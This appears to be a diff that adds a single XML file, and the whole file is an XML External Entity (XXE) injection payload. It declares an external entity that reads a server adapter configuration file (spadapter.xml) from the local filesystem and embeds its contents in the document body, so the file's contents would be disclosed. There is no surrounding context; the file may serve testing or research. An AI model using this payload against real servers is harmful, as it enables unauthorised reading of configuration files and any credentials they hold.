@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///opt/out/instance/server/default/data/adapter-config/spadapter.xml">
+]>
+<root><data>&xxe;</data></root>
